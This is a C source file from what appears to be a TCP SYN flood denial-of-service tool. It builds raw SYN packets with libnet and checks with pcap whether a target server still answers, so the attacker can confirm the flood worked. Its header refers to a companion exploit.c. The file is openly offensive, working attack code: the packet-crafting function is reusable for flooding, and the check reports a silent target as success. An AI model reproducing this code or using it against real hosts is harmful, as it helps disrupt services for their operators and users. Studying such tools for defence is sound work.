/* NETWORKING.c
 *   by DukeD1rtfarm3r
 *
 * Created:
 *   10/09/2020, 21:21:53
 * Last edited:
 *   13/09/2020, 16:08:11
 * Auto updated?
 *   Yes
 *
 * Description:
 *   The functions and files in this file check if the server at the given
 *   ip is reachable over the given interface. Doing so allows the user to,
 *   in effect, check if an TCP sync flood DoS-attack was succesfull.
 * 
 *   For a list of the most important sources used, please refer to the header
 *   in exploit.c.
**/

#include "globals.h"
#include "networking.h"


/* Construct a TCP-SYN packet with the given source IP, source port, target IP, target port, given sequence number, given acknoledgement number and given payload on the given libnet raw socket. The 'tcp' and 'ipv4' arguments will contain the resulting ptags of libnet, unless the pointers are NULL, in which case local values are used. Note that if they point to anything non-zero, libnet will overwrite existing packets rather than creating new ones. Returns 0 if it was successful, or anything else if it wasn't. */
int create_tcp_syn(libnet_ptag_t* tcp, libnet_ptag_t* ipv4, libnet_t* l, uint32_t source_ip, uint16_t source_port, uint32_t target_ip, uint16_t target_port, uint32_t seq_number, uint32_t ack_number, const uint8_t* payload, uint32_t payload_size) {
    /* Check if we need to use local tcp & ipv4. */
    libnet_ptag_t local_tcp = 0;
    libnet_ptag_t local_ipv4 = 0;
    if (tcp == NULL) { tcp = &local_tcp; }
    if (ipv4 == NULL) { ipv4 = &local_ipv4; }
    
    /* Build the TCP header. */
    *tcp = libnet_build_tcp(
        source_port,
        target_port,
        seq_number,
        ack_number,
        TH_SYN,                         // We use only the SYN control
        4096,                           // The window size (pretty arbitrary)
        0,                              // The checksum will be handled automatically by libnet
        0,                              // The urgent pointer - zero, as it's not urgent
        LIBNET_TCP_H + payload_size,
        payload,
        payload_size,
        l,
        *tcp
    );
    if (*tcp == -1) {
        fprintf(stderr, "[ERROR] Could not build TCP header: %s\n", libnet_geterror(l));
        return -1;
    }

    /* Then, build the IPv4 header. */
    *ipv4 = libnet_build_ipv4(
        LIBNET_IPV4_H + LIBNET_TCP_H + payload_size,
        0,                                              // Neutral Terms-of-Service
        libnet_get_prand(LIBNET_PRu16),                 // Arbitrary IP ID
        0,                                              // No fragment offset
        127,                                            // The time-to-live on the webs
        IPPROTO_TCP,                                    // The next protocol is our TCP
        0,                                              // Autofill the checksum
        source_ip,
        target_ip,
        NULL,                                           // No payload, as libpcap will link these together
        0,                                              // Payload size is therefore also NULL
        l,
        *ipv4
    );
    if (*ipv4 == -1) {
        fprintf(stderr, "[ERROR] Could not build IPv4 header: %s\n", libnet_geterror(l));
        return -1;
    }

    // Done, return!
    return 0;
}



/* Tests if the given server is reachable over the given interface on the given TCP-port via TCP. Returns 1 if it is, 0 if it isn't and -1 if an error occured, which is written to the given error buffer. */
int server_check_status(libnet_t* l, pcap_t* p, uint32_t target_ip, uint16_t target_port) {
    // Extract the ipv4 and netmask of this interface
    uint32_t source_ip = libnet_get_ipaddr4(l);

    // Build the packet
    uint32_t source_port = libnet_get_prand(LIBNET_PRu16);
    int result = create_tcp_syn(
        NULL, NULL,
        l,
        source_ip, source_port,
        target_ip, target_port,
        libnet_get_prand(LIBNET_PRu32), libnet_get_prand(LIBNET_PRu32),
        NULL, 0
    );
    if (result != 0) {
        return result;
    }

    // Compile the filter used for the interface
    char filter[1024];
    sprintf(filter, "(src host %d.%d.%d.%d) && (dst host %d.%d.%d.%d) && (src port %d) && (dst port %d) && (tcp) && ((tcp[13] == 0x14) || (tcp[13] == 0x12))",
            IP_FORMAT(target_ip), IP_FORMAT(source_ip),
            target_port,
            source_port);
    struct bpf_program filter_program;
    if (pcap_compile(p, &filter_program, filter, 1, PCAP_NETMASK_UNKNOWN) == -1) {
        fprintf(stderr, "\n[ERROR] Failed to compile filter \"%s\": %s\n", filter, pcap_geterr(p));
        return -1;
    }

    // Assign the filter to the interface
    if (pcap_setfilter(p, &filter_program) == -1) {
        fprintf(stderr, "\n[ERROR] Could not assign filter to raw socket: %s\n", pcap_geterr(p));
        return -1;
    }

    // Send the packet three times, to account for packets that might be lost
    for (int i = 1; i <= MAX_DOS_TRIES; i++) {
        if (libnet_write(l) == -1) {
            fprintf(stderr, "[ERROR] Could not send DoS-verification packet %d/3: %s\n", i, libnet_geterror(l));
            return EXIT_FAILURE;
        }

        // Wait for a response
        struct pcap_pkthdr packet;
        if (pcap_next(p, &packet) != NULL) {
            // We received a valid packet, which means that our DoS failed...
            return 0;
        }

        // We didn't receive a packet in time, so try again!
    }

    // We did it!
    return 1;
}
